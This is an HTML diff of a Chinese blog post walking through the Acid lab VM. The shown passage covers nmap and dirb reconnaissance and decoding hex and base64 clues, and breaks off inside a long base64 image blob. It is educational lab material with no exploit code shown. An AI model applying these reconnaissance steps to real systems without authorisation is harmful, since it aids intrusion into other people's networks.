@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Acid靶机实战 |  Time
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  
+  <canvas width="1777" height="841" style="position: fixed; left: 0px; top: 0px; z-index: 999; pointer-events: none;"></canvas>
+  
+  <div id="app">
+    <main class="content on">
+      <section class="outer">
+  <article id="post-Acid靶机" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Acid靶机实战
+</h1>
+ 
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2019/07/21/Acid%E9%9D%B6%E6%9C%BA/" class="article-date">
+  <time datetime="2019-07-21T11:14:54.000Z" itemprop="datePublished">2019-07-21</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+  </div>
+
+      
+      
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">9 分钟</span>
+        </span>
+    </span>
+</div>
+
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+
+      
+      <p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ynsl44uj31c00u044d.jpg" alt="99"></p>
+<a id="more"></a>
+
+<h3 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h3><p>靶场环境：Vmware虚拟机 ubuntu系统<br>攻击环境: kali、windows<br>网络环境: NAT模式<br>IP: 192.168.190.130</p>
+<h3 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h3><p>nmap 扫描开放端口,开放一个端口33447，运行web服务<br><img src="https://i.imgur.com/EzUWQQQ.jpg" alt=""><br>老规矩上扫描器。。。<br>Apache:2.4.10<br>查看源代码发现一个/images/bg.jpg，图片目录，似乎没有什么信息<br>对首页F12发现一串十六进制0x643239334c6d70775a773d3d<br>十六进制还原后d293LmpwZw==，base64解密后wow.jpg<br><img src="https://i.imgur.com/2OhEiSA.png" alt=""><br>。。。没啥信息。。<br>dirb跑出一个/images/Thume.db，用c32看了一波，发现有这些数字，不知道是啥，先记录一下。<br>456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz<br>456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz<br>*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz</p>
+<p>哈哈哈,柳暗花明又一村啊，习惯性点翻译中文，发现图片上面还有有字，检查一波看了一下，发现有一串base64的编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R0lGODlhCwExAfUAAAAAAAQEBAoKCg4ODhERERQUFBgYGB0dHSIiIiUlJSkpKS8vLzMzMzc3Nzk5OT4+PkBAQEREREtLS09PT1JSUlVVVVtbW15eXmNjY2ZmZmtra25ubnNzc3d3d3h4eH5+foKCgoWFhYiIiIyMjJKSkpeXl5mZmZycnKOjo6Wlpaqqqq6urrKysre3t7u7u729vcPDw8TExMnJyc&#x2F;Pz9DQ0NbW1tnZ2d3d3eHh4ebm5ujo6O7u7vPz8&#x2F;f39&#x2F;v7+&#x2F;&#x2F;&#x2F;&#x2F;yH5BAQAAAAALAAAAAALATEBAAb+wJ9wSCwaj8ikcslsOp&#x2F;QqHRKrVqv2Kx2y+16v+CweEwum8&#x2F;otHrNbrvf8Lh8Tq&#x2F;b7&#x2F;i8fs&#x2F;v+&#x2F;+AgYKDhIVwOyYVCACMESI3SQSMk5MzMpSUBEkqGRGMCI47UJyeAKAiokiSmKyZSYiKk46QTbCLjY9IM60AFYZaKqutHalFvAAuLsdHKretIk3Nx9BHx8vMwqzES8HH20XKrRG&#x2F;WBnWjAwzRsfJ10Qi5wAMxUfw5&#x2F;Pr8ZhH5vfqSP2spStyg9c4clU66DNF7we7cK2KmFiI78hEfRWHLKRkRKE+BA2FeIwH0tgzhFQg6vNF5KG7H5c2djiyS6bJjQDA4WRJRGX+PJ5CeFFDGcXZQhctebXjRaTURqRFIOBElhRnEaP6oA7BGk+rw5NER00FAKEqq6URhdTEmaHI2o1tNU4lomLsQSF1p979ympo2CYBcRZzyVTkWAD0RgqWa3VI4I3FHi8cDPZvEwaHVTA+65OjEK76NG&#x2F;NvHkhEcxjRf9APVV1tkl+LSs5RkAEa0xDCafdcQwBaEYzhfDm5dtbaUoMIihfHiFuUF61b1PKDd220CFOKZmQ3eTYuM6MqLdCy0oIeEbkMd09j4z9XXZMjpU9L57V9+tCsk&#x2F;yyl3VMXUVKCfCgAPSwhdn1+Q1nntDKIigQcftx8RrlKhDgXIhEJiLEBT+VvJDgI5oaKB+6PW3BImTECBDfEqxJ4Q9Cx7DwBAwPtjKjM+NxwSKjBDwjxI8AuDjjjqamESNrBDAXz4xFoYkJelRggCNurEyZY7WxEYlbUsW8SQlA3TZVJFGHlHQOVqahUmUk7wIn4YDmpDMj1+WCKcIcrrwoz5p&#x2F;nBmlkr8OQ2QZJZphGSsMGDgTTaW90OdVDUBqZhMAgpQPIomgSgmmdZTqKFE3NAhJkpW0+I1kzqRanfx9OnnqJmIKWo8pRrxJahJXBSPahGi5+Kj8EkaLItoKqHrObwSUcJCyQLrKK5HKHbMAD9iueavqzKR7RJ8LuGBPkNGqw+1XqYFrUX+GDF6LarDLrHtbK0ycayMuaZLRAjmnmtEN+ds12t77Cr1VnLLDTXpwMzVNygT&#x2F;FrjLzbxPOzsPvoicYN0VqoJJbZVqrdlk+L8O50TF59zpcUYY3LyDw62WfEPySRDoAsVnLPnqU52TMldkzJo7XQzIxGzCzPXbM2PQxdt8xCdrQwteDNtGt6&#x2F;bDLiJs6tONfzMc69JPQwP0gNADVQh20pzPa9DB6OQSq8ccAg9&#x2F;Vxo7j9y8Ta+S2M9w9tM512xedBwp7bk6jQsmfsVT2231jL&#x2F;bPLSgSONn6SD874zi8fSIkvkD58WE4&#x2F;vKXyb5GG3hvpWk2lSa+cH+N5K63z8nD+Z3udS7o1WsHam8jWqLuRxvEQcfuwwyt1L5zVniv2S0F6N4TRONUO&#x2F;UZ7jUXE8oUJgX2+mSMx70rvjDXU9xFLNJbE1g9B&#x2F;jlArW8NUKIDEEL3uhe6Q&#x2F;2k0lN8JiHtnyI96RsC&#x2F;tZUhAFCqSeOexmkWlGWcm0kNoezxvz2hZPYBPBqC2lg+Kink7p1r3mZWNQQUnYjflBEUyf0XfCKAMIUiTBv4BJhZ1wFqh2QEEzJG4IN4xGBkPxgBy0sCRKASJKQXFA4N0zRio6ww3OEC4Ee7N4OppeoHHppVLVZgrTU48MibHFnPjyicKjIKSvqkIzIWWIHR9Y9pmXgNQyQmBL+diCCWJiiAqhowg3emIkKUMoIe8wGAfwYibkIjY&#x2F;IkWMSXIDIScQxCfGjYcVuELM1UNIFL3zCJTM5hkv+MVCVbKMoR0nKUprylKhMpSpXyco69IAHO8jBDWxAg1paIgYxgMELdgkDGuigB60MZhV2UAMYtGAFKkDBCUoQgg5s4AIUgIADGLAAaioAAQcwQDa1qYAKnCAHwgznEnRwgxm8wAQaaMABCDCAAQggAAAIgDzjCU94MsKe94wnAARwgBDgQAc88IE4xckDSpJAAxBYgAHeeQ57ztOh+pwnPQmgAAU4gAIcMIEMujjQNvrgBizwAAQWik+HSlSeKE1pAAT+wNIBEECbCVAAASQaUXgKAAEXYAE4OypKYrYgBBEoAEPziVJ34vNzk6DpUQuQgRjwgKcV6wEOVsABBwj1pCtt51GR2op6YsKmCyCBDQQKVUPxYAYlmIABjipPl26VEgVIzgU8QIIToCAFKkiBMkswAhA8cwIPSMAAjqFURggAAiOYwVPLKhsf5OAFHWjAAEy60rcyogAQ2IAJXoADYEbBpyFQhABYgdJ87nMBIxgrY4niAxukwAIH+OpkW2EACHiABZwcJgxA8IDBkhYTA5jACxa72kLwgAYjCCpEaZoi27IAB2TwwQxA0ADL1jSsOSBrcQHRgxhQd7L1ZG6PJkD+ghqsoQctwEABnLgBGnh2u3zYwQw+IFlKiLcA3rRBHGwAggTYV5+GfcAKOApfOPTABirYgAJGe8+t4hcFuW1DDkiwgK8C+AAk2GmB6YCDE0iAAAwGMCUaIAL96mHC&#x2F;iXqPQngARNv+BAuwMBaj2EADLTgvXzAQQfW2woCaOAG2n3xGnAQggUntaQOIEGE9UADMtbTAjUIspDNwAMYVMC3IgbAAC7wAilHgQcabgMKUiziAGDAxVMugw5OUF3xEiADarSCDcwLhz2WtEcg0EGay2ADDxiAthygwRZcQOc4rMAo8DTACPS8ZzDwIAZX3uoBWtwFFUBXODXAsRpsMIH+LBOgA0tutBR8gIMSMODOBvhAqKWwAxUQFwYcIHAZfOABr&#x2F;bIA9kVdRZ40IIKzJQSAtAAmrmAYCKAQJJm6IEIQnxZExBX11RA8VYlEGcvyOAFOrwADOTAgxNIIrwHSMGzof0EH9Rgx0dFQArIAIMf1aACl44DD1gQWymJm9xRkMGVwbSBMIPBBzx47wsw4GU3+KAF6&#x2F;UqAlyN7yb0AAYRsPUCPqmF1hahBRmQtRp4gILXGIAEOCh4w4XAa8w4NONmyIGge+IAFNhhByRYhT23DINxj&#x2F;yHKkgAPgngciy8UocZWLcRZnDvIbxAASS4gw5CkA15MuAEOhC5rnVQgj&#x2F;+O9KMUmABtoWAAgA4QNM&#x2F;eEEJ6PECBCRd6SIowFYNEAJ&#x2F;kxsHIOBxI9xOBRlkIN7mcIDNUxCCZ8cgAcj+QQ8ynQYdjPmrBcjzyHPggdkyAgM2p0INIgCCIejAvxcwgg84kIEg12ACI2iCDWK98RdIwNZaXjS+b9D4pAYnCzBogAWK0XUAhN4IKXgAPZpMgsgXYQcYEHoaSN2BrRKg7dC+QQewHIDKZ8EHI8CphnngAC1b0QYKaAERYIABCDdhBQ&#x2F;Q&#x2F;hqWzuB6FkD1jc4BCJh&#x2F;eyzIQK0hCPJFHgB2wUuAAhq2AQtmEAMhyEDqPsBbKyB1YsADJDBaDmUAzrZndCT+dwEQeEuwAzCgAQZAbUWAAyl2AlIWUI&#x2F;SABzAaELgAzSwAx5AACygBDzAARAAAjWnBj1wgKZlACigcTy1A1UHYM4XbSKQARKAAA1gAl6mAYzgAJZABDswXD&#x2F;0AQ4gfFvCAHQ3BDwQAhTQAXjSAi8AA4U2BlHoVfCkbr5XVj2gAgoAYBtwBT0gAxrgTSBIBCcATwNwAi4QbzWQAhrWAzPgdjVgdWWoBD1gAhmQJyyQAhS3BTvAAVulACvwhR0lXQ&#x2F;gVZmXBTawhkTAAqsgASawbT&#x2F;gAy&#x2F;AAopIBB9wT4pkBDIAAiGwf&#x2F;GWchjwVQxwY&#x2F;CVAxoQYhDQiViQAquQACH+oHgDN4hDUDJaxoRIIIJXGGVpsAOdJmIN8AL1N1A8UALCgACn6AUz8IqMMAAR8AEgFwIWsAJR4AMkUG8E4It2gAOo4VAQEAMEGEwwUGH3dHZdcFaJIAwDwAAGgAAPYAEUkIVPEAMWYHUD0H53IF1YEQARIAPJGEw3UAESZQCYqAVTtQEMwGyGZQAR4AAfoAIuUJBKMHoeoI4AYAEr948x8GclJQEzcI6pxAPLNgkCMAImyQQ5AAMjUAH1Zl+U92cPgAOpFQPD9gQ90FQzwJEFwAHVRgcuwHz7BGU8RW+UgAGS6AQ7YAMuMAIb0INvRQAP0AEtIFDwIAAiQALt9oT+TZBaN0ACHQCPEZBYNIgG0LdVAuABTclKNSABSeUAH8kEjgUDImABDAArCYABJ0B4RjdaCFACOPACA0YFMZADKXBbJsCRhpUAFfABKTADOCCL0XUBKmYAKoCRprQDIRBiAeABJvlYIUCVx3AAEeABLeBvPOACJaAB9aYCMOACMMCZkAQDJiCZJPAAExABBwCRWnYADjBXJQADIbcGO9AArPAAdclKLmAUA&#x2F;B6UKgDOCADJ9ABFPAbFCUBHEACnJUEOoABFCADKQBPGrACOYB1TBADJUACI3ACJtABNJAICZAAM8YLAmAAD6ABKDCCaEADIqmSHfCWp4QDCJlU&#x2F;ej+J9eZARTgAAqwULwgkR2wAjVAoEdQmX6yXooiA5aJBDTAAhzQASwAAyogY9ToARlgARHQAAwgU9YVjxpwAr5UBiggaSzQkpnTAyNQfvGkADGgA47ZVQcgASDwnVYAA+tFks8oBTGwASgAAyVQAWuFABwgAhzwAe&#x2F;5AjXgAikAAtA0AQuAZZMwAAkgARgQoh7wASBAireoph&#x2F;QAXDaAR4AAiegU08ghCJmAUtqSuloXwPgATugbBXgAAhgAAVQAAewABhVnMeJBRw3hkSIBSvwlzLQAhWGASrQAjBgAwHVA68kUD6wAzdQA5ZwAhrgAAYUDxrwBDugjvZUAM1SSjj+gAEPJU8OEGc+QJ03gAM4kJafxQKQ6qtJ0APJwAFjaAE7+Ys7cGk8UAMosAERgAAg1got5VIvhQAWJQEV0AHqaQQwwKMBgH+p5APedmQFUAK2+QU2IAkYkAU6AAJpBQALcAM3sHVVkAM2YE4tsK8tQJsyUEs1YAM2gAM50KFIgKeTYAAniEo08ABEJQAXsGpf0ALw5I9VAKUkIFQtQANFCgg6sAj4hHKmxAMgwGwBsAALqQYcsE&#x2F;956gvIIQW8FPN2QcmQFMIoIu4EgNj2GDnarCCxwMB1wM4igQ4sAj0B4k5BwAb8JfpWgc8wBrwVAESayg7sAEIOI0ZEGY9EBL+MiACHoABEGBNDNAAvIkBHjACJsACMvBLTYAvAACOU+ADfMdSJDAD5TUINdpgBFACPmsiLTCT8eQAtRlwQsCxIEACLfBUQIoT+ckAGEAC&#x2F;+eh63UBQ6sEMyACJRAABcACJRCrR9ADORADK4ACJuCeI0ACJqACnFW5V6AD+rEAXSZKOoCZXlUAztYCHXClKLBR8nVX1Sl3ADABF9CbDrAAhSqmwNYAITBsRAQBFhoFhYkCA6CZDGe5JYABDnCfXVUAD8ABLCCsF+tb9USSosQCwGtm4ERMlUoCHMABKABdAVhvPrgBxQBwPEBOMLACJeClDAC8BtABGsYCwQuWUkD+rCoQAAjwAjLgVEdgAyLwAMCpDwmgARdZgMUHJhpAwGWSAxTAhSj7uWhFAjHAAaN1AK42tD1wAyugAWS2cEKAAyzQtE7wAqQrAAUgAixgAiJEAxoAvPtEjxWQAR4QAkT8ARswqFaXVCSWrFpwA2NYuykgw5axAsBLACOgiDOQYhHwkZqIAnd1VyvQAjLAqUewZsrJCBwgxU7ZATXAAu70AjvwvToUd0q8ASmwUQAIwx1wapRQYynLBSwAkRIwtX+hAx2cVBewp2oBAyhgAAyAAkGWAiLAry5gAg8QARMAARPgvSGxjLdQAX3LBNeGAy1QfTVQAy37AyzAGgnQATH+oMY&#x2F;wAMvi2gRkALga5cWcFQEAIT60mrCEAAJkMpF4AN6IlA50BBx&#x2F;GxnSJk28AKlmcZmYjTSuQVZqRAbELs6YIiMgHTP6wQ5cAIRwGwNUALd&#x2F;KlOYAM8Nr6KzB0+YGWIJgLJSANMTHK2yQM2UJCfWADrTAUqfGDyqH0ycMYGoHhJAEs4QAOWMANk&#x2F;IswkAFJLA8kQA86IAP6q6YoEMNO8Ik7lwKsawgH6Xj11ENDNGuY0a1SwAOd9UOcpQI8dgH4SAT8taIKkADYhAALAAEXYALPawMfQGYA8ADbNmFqmrabCktPoAMzKU8RMM9&#x2F;4QMooHZcKCT7XAYnMAEafAX+PnDBCeC5QkACjswBnduvLXACHEAB&#x2F;csAGaYEOTACHPmGNwADt1wEbmtPBEACsDwIwCdeXtfNZXDXT8ADHpHIShCAJ+B7OxADKYABB0ABsqYDI7CzD9gCddUCM3DXH3tUDvDSslEDDlBaCZuVRhIDpnACXFCdLbnWt4C4J+ABG7ABQ9m2wIWuZSIDCMBWexvKgrADK8DUZXADvvkjPbACF2DSRoDU9MQIEzDVCPECAXpPADxyy2oEkj0FIJBUQnKjRtICvywPvN1wcY0DwNuWfv0HbShiJXBzX9AP9USXHf0HOLCz+qTP6O0FMWCyFDCzKIEDynlUGjTfW+ADpWD+TwLAAbi9BzdQfaYFANOsBz6wAs8k26aUAtZtCjjrBzYAtQAGt3VAyiqQHfgtRSlWfkxJFDQQpCr52nRgAkaxABjwAXytLxvwXwqJEiUOYDR1AC&#x2F;OBjkQ42MKAqFc4IIAEQIOgXtQ40nFAI7nAHggt44Ju1OwAx2AfibCA5B9T6D8CzMA39v8AXJHAXfgAvohAcqNBDawAQkguGWCp&#x2F;iUAB&#x2F;uB1luXwggJ87QrkdAamtgA7QqJFZnAUA+AycQ4wZgr9whwEQ1AFzNBzLg08A8djHgDB8AwhSg4WCQAyFgdRVQAoMl0lTwgj8a4woQ13+QA&#x2F;X2UBb7BzIAuPKgAqL+QAMKUE9p8nkXMM5lkAMisLMNMAEmsLICIMxfVgL9FwM4QAEKbiI+IOz29eiCAAOAKwASgIxCUANnLD9IsAIT0ADnKgY04AG3UAAY8AI6YAFjeABXnQQ0sG09gG00oHak3R9um08d0N5uwNwJyAHVYsj2lINGkANSsctegAMoMAG+FZ16JQKKKQkIMO5LQAOj6l3xpI3csQKmFQAcEAjMnU+D6W+bNwkLPgS4qXMH0N2DLQM1UK8joFYJ250ygAMqIAIpUAMOSy5RQHVQ0c4yAAMyUDIH8MdEweMNNvF&#x2F;UPH35ACceATtfgG+ZwOrbYgW8OQzgALiKVPANgGjuwL+WuoClA0CLvCJShsFwGp7QnADJ&#x2F;B&#x2F;BHnBtjveeWABrKAB8K4GCLcztek99gQBT5jNMaACaM+OSPCSLWACHjCoCACRAqAAFzACKaClLS8CKV8CC0z4&#x2F;hUA69628KR3XIcU+se5GTuEAxgWK7BczsHgDRMAE9DmP1CePfrhEmg4SBoAoJYEk&#x2F;dWBaAA3HnHxHVg0IUDLs5fYTgCHCAJArD6lluMEBBvwPSCcTgDM1CakwABJUDIe5CKDvWIDI7plDABkbtIDGYAvD6Ju5sCGVDCyP65MJACdpUCI3oD6cqxO+ACkMxXXs0INUahUjYDG7AKIksEOoBtM6AC6kBVnX3+WRTgfUDwEw6JReMRmVQuiyzAExCIMKlVa9EXEkAFF5tvOdsCBq2kLIdSwSjPQad2tdJuv9HNx&#x2F;vNJlCAoEOIJ4ViwI1kqQZGaCUH5qXBAKqA4qRODjOzaiYgIOqvpadHk7Qqy&#x2F;NJYONyCcfwz0QJB2TnpMPPwCOuNIknh8inJSPhSWGFhMFP4UXuhsZGpYSDogDKwGJFh3c7M4fg86kg42QHjPtcx2SMbESbikfyiWMn6YWmhiTEz20D55wqR4N9xUD4kwODhYwXJZjZMEHhW7ENMPT8w4TDxIUUVHrEe+IpwAAQvyyWysGBAKoBKOhV6XHgYwRWSETQuAAlgAb+C08QbCx55sGAAAIKTEhBEtOJFT9y2DAzxAYJCOsafIgx6qeSHSOIAdBQJQFIcAAMhGiZVc6LalAeYDWl4GOCGEpmlNBR4SOADT9YLHhyASnaIT5syJgxM1PFHztQ1JhBg4gMD8k+LtiwAgcPc2h3mKAMYIJBJp8BKFhXwMRZwVRcFEAVJdaVB1AGqNDqA4YGPxaE6NjwhMGi1cOd5XA7ZIcLDXC5JHhgIWEMGC1UnIChw4biKzlGUPCbioP2JbM&#x2F;MtDyCbX44UhwUOg0SXiVNqjmKenR4jcUB25NVBsQ4rj1BCRihxhM2OACDDSo4IENMrgggw9WWMGEFGAIcIn+HmLYwKMoKGDmij6gOCAGEl47YAUVOthsQGBecOA9TxhATAnd9NuFPRXwmmQmGSiLYIYWhVxCBxlaYGGFFmhQLxHmuKDAhUww8IOAKEsYI4AD+gBhyCJ6SAEmPyZg8gh9oKhSCRds2cc2InSw8Y3AupyzlHS+cyODuTTJL5WlfjDhlZA68ZNOHkJwLa9AqEAhLwFKYLGIEWIYYZ8LjlDhOwQ+sIHOTjGhwQMnP2KBFw&#x2F;AqW2IFNZCD7JOcUDpNQHaXMIJcDYgc4cQ7NjHADl782AMAihAQTRPjSWiBxwIeeVMAAqgUY4PXkN1iBhEBaAtT23QICUoEOB0CRqwBED+Amh&#x2F;8EGbEwY6IYkWwnziAAtOoAHDY4XsoQMGVrUGBLwScIcUU88klYgbyIMitk5vAOFd0OolgoeuPEFAhiVWGGgCuhh4jwsGMkBhhoftRSsHEAZSgAMPaNghmQggxYSDTwIoIMoidtjxiQUApjMHEg54TQSRhYDAjwEIToKEgQZoFQkZJOmABAk6FMDjeYUemZQeajjBgoYPoEAFPVCwwYNvONhmSm+DNMIHDV5T1NNBuiKjhZeJyCCvAEawW4gdPBBonw+WwIvdH3BgoQMI9h3AYxNi2BnrK3hQwYIIQPDAAWYBYKCDFwC2QYQPKvCk8FLwQqWBYiGW1g0942b+YVUFcDyihLwrgJwIHGaw0Y8GhD5BViNu+GCADqNAgIIPWFgyciJnCIG0jj+40IgURJAALwEq5kUCcMZMwge8o2CAzHtRWOcC3IeAARVPEtg+CTP9EMD1I3qYgckcEiigAxY+kKBhf1DABDQQghXIwAbq61IPbiADFoRAAxJQgOYEOI4P1KEH8BNECDqAAQcAAAG+koMPSIMBvvUGcAC4QPla1IP8dGIEZNJBwwRQOiSYYCAAOFsmdpCAAyAFBzAgAQY2NpCQIMABFdiAB0iwhsfY4AY40EEPTig5HDjGBSbwgAYmoK917CMBH8PfD3RwAjC4gGAv8AcMQLBEBID+popUmCE4dqiEGAgAJLo6lg5SaAAWPCwCqXhCBlRjhBO8xhrmWkLEMIAEHsAAAgcQAAK+mMOhDKAAB0gAAxrwAOxhAAMZEOUoM6CBUo4ylBi4QAUk8IAFGEAoOaRNWABwABIUkgU1M4E2fHDLH5RABBrgwBbqSAoZMCsAelzCB7iQgqsJCAbMYkAM7CawLQTgAbMzpPGeIDhM9IAD8TnCCgwgAFgS4AItIEEHJ+AABBSAgrKU5zz9EJICLGACGeCAX0DyDQcwbQg6QEEdauCTGaDgBzcIQQg4EEgA2FATLOBYABDBhB4Q7Ql+tNctYqLBIbgAJ2QRpxHImUMDANT+CnH0weg2xwL1YMcxCFnBCbonAAEIKwOqvIAFLFABClCgAkGtgAVM45EIdOADJUhIDXDgFtaNYUZHOKjYwGUCyKBgBCCwwBaWtg1KfSQAJahCDVaFgJHOiQcpFIAFwOWmMHlCAAk7Ag+iBwUJxFETwwwAoQDCnArgVQg4yEBKDmAC1RmBB+qQRAE8KoQesIAZOyABGG6wtx6EoAQfiIfOeBE+sQCgolSoXWWoaSwZROQPZjHCTmRGSCXcZCxQ2MtPcMiAZxZhAwFAwFOqcDEAeKAKO1CAJ0SABKcECQZ+YgGpZECC7kCBN7zgQfdwIlcmiO8JD1ibp746sboVgVH+4GDAdo&#x2F;A0YlCwZsWqcEAKoCJFURgA4Vcwgucddgk9CGESICBC7Rh2MWcwB8pKEEGmDWCbfAAAmIJAESJNBuQSKCtdPKBiKIQAY&#x2F;ioBqoKABfjaCCkIY0AD6xiApmNYcHFJMKNwgABKzQA4FkAAk7gAE10yGEGGwkByYgwaoCcFZM+KANOEHoFWrwxo9UIMJzuoGRo4ABxLAWrgBKgrjy8mEGJJlOPYiAMoNLgK9s4hsMFgINDMOXRfTgBEFqQQowWgz5&#x2F;pijqRCxFVzALAFgQIRCYgEen0AAEOzMwzipQJ7JeK19EABI9oqBIuuB5STYoAQtIJNhcOCDEtDDBif+6MEOVOABRH55G&#x2F;pQCW+voA6ccIDQA4pzAAzgy94YuRMLaCwRgizLBRyAAENu3pByMAMZ+GAGPlkBqWYwAuNxmBQ28kQBQIQJ+f3BA29uEYL90BPFxOwjBEA2EZ6dACcFwAIMy&#x2F;Wu13OcGdSgYieIQ2dy4IMVfLDaqb6CQ6NAIlLEmR0sXE8NfvYRB7hOBusIQAek&#x2F;YM7QiEBBkDFBcDQAgQQoAOOJjc3dMBbDdEAB7kCQwxsYwMKowLUvMAwTihGCh&#x2F;ETCUk0PdwWIDMDIim1gFwgMR&#x2F;kFY&#x2F;MEASBNguDBqgALHWQEIT&#x2F;4cMRGwDMvsASTUH2Q+w7YYo1GwbIAX+RwLIC+f5oeC2gnk2AVTLFz&#x2F;QTAnMTEUFtjDbIdTAAyAggfJEYAIbZF3oSRj2+mywCLf&#x2F;gAYIbcFr4Lm5lVfBZHlhAEozseoBPKpTQM7LAVKghx7A+w9BS8IMAvUNAhA+oTXQRmJJYN+4V0EHKtgFDxCIg0yPggUwWDJOaFncczgUFQ+g+RVC8JoAYIBePCNNA76rro9QINUUfkIjPz+cGbSAJBiPAQ9WwAyByuBgzpLEARh9BRusBSTAP8eVXsOAWQ9IBoiqcJB4wE8Q1o+k9Wx28bOCmxfQAzdFKuMviC58MsjjH77&#x2F;QxTiiw4OIFIC4O4nUsD2vOCXcGKykuD+8biA1NivJHTABWYADHAA4xroj35ABSCPC5wF8zQBykAitEpBazYgItqnAYdEYDxhAD5gipxEAjxPCAItZ2DQATWh0miAzGxsB9BgBRZhBuhtIFDMJOKhWwjgaEiBB14gAirpCeZsgXbEExivB5Kmz0rMCHog+iTgLHyg4GowCWqAGXiABDSkBjglCX1ABm4gBXagB+wPF2ZPDvTvFRagA00BB0iAltrnCSJAgVokIGQmArLjTgYtTeBq+EbBBzBgAWjQC43AqgyOHGhgBrShDHOABmAABnYAu+rpCbjkH0SkEzwhA&#x2F;pwCXwAB1RAAjTnNdLHXpyGC1SOAKOgNqr+KGYGYAw0QAdEoL4aEfT2xgdSQAZoIAd+7QdeANhkwEhgax&#x2F;eIwHk7Qpo4BViqQBUALAQKwYyAPuqbAAMDGtabkRaQAcOBgK0qQio7QBeQQHeiAJ2rQVE4O+U4AWiBAcGiiIWYRgNbgZYwNBk8QnELGBAbAKqL8ZQYAEQqXd8zFhGQCwaQAbq7CM6gIVwwC8g4BUIYAC2zVhaADQOKwdIsW88AJ9iYAZiIA2v6AdkQAd04AVIgMn2AVEoQACJRGLghRoxwQY+YF845g260FPS5gkkIDdQwQiryGnY6xUKoOrspQd0QwGOUAYSIAE0gAWQYgfOwgUcjAwmAAWYASX+ceMkOyBQeMXy6jATcAgnBIADPPIKZwADwhInICApI2cHyKMTJmAF7uSflkAGKoDEIkIBENJTeiDwJqADOoADBOIVDkADWkAkZSAGWsACRBEGOsDIJAAZf8DofuAEvmEAWpIM4oHLtmEBZWYBABMJeuAFJIDPwEjTiu8Gvu0CUCBQNMAZhaAF4qEAdC1yXqDNngAuVyADwmQCYgDt4CUWHqkFUEASwA0May4&#x2F;bq2eFA5b3rEKZPAhqdMHKmu4PqwAPoAnI2cG3kUARkBg&#x2F;uADatPgmCMn0PNeZuAFXgAGZOAsdCAFNPAAQqBVJIseXODdyCACPKAQ3GBxtoAAvk&#x2F;+E3gA3lDBAE4wCXaABSoAmT5CAmqgGrGmBZhltyQAFdCSEYfgBuitAUyT3HigBCyAAjZgdkiPCEDFSRyAui6AycbA9f4hBT7sBd9BBjig31wyBKizeUbrCSqgL7hgFaqAB4Clz7iRF5kgBnKgBRwo2sJLAUrwCb7nH1hmHwZgDJngBpBBD6FgAVbAR3dNN6KsBeZGFTp0CFhgbiqALJf0B2YsDmRgKVRgHxMADjFBF+spmxYJBiwgnsjgAmQgJndtByDvIq2FNjqAPWug1spCLWuwB&#x2F;ZrFOZFByBpINDEImwgHlABAbAOfBjjO2xvc0hAIB1QBt7lpGbgTjg0pUT+YFUWwJng1EtQYBG6dA9g4Kv8YEb&#x2F;wSeXbQQKzhRBICejwAA4gFBplW1WgFkaoNckZgA44FSHYC&#x2F;9QAKgjlaRTg9WIEpcAAZwYG68okKr0&#x2F;a6k9CSg7r0cAAsoAW+kxd9QATEogJ4QFFTQQPIcQlS4DMCoALWj1Z5IFh5YKB+gE80oFCXwAbeCCRWMM9IjwP2BQoYwATaTVmVQAeUMQBAIIMooxPYSg5ykckCYAIukFZhwDZoYCMUrzSMsSRqLQouwL56AHSIQcEE9SoqlglsQK1sQwYgD9ze9AhugAM65AFKYFp3LYF+oAd&#x2F;QNluyl95YU8&#x2F;4gFmTQdWYCpyCAH+QgAPcJYKXkBVIYMG3OMjJgBfmaAGOsBrMgAcl3QKdcBUBCACqgEC2JMJXOCLEoBkh0BmcfLDouABVsBdufYHvmQ1G0AbbICl9jBPkUCh7iRnOMAFDrZTtuY3KAEubucfEvbrYshLYmACPusjDqADck9wg8vToIDhfqAGLqD70O8K6BMi6skBRGBx7cUFkiEBUhEAOkByj0AHEpQMUK0IBAouEGlm2DVwS9dDIwBohKAGtuoTDGAFxtUIaEAEHOCLCuACXIB6h0QGBGKTnMUfNWEHqCsVDFBvrzGeBkACVIBilfcKcMNJBgBEZoDsuAAieUFDJoNPJ3bi8AaWsCX+LklhB&#x2F;qgfRJtCDCieENKAe6gd0sX6WKHJGpAAzRnmriBB1jAAlALABKgA6gncogHALhuTBfJZbGJZRfjBbbqSwVgAkAYfg&#x2F;0PJ4gugynAzh4G+NXZFh0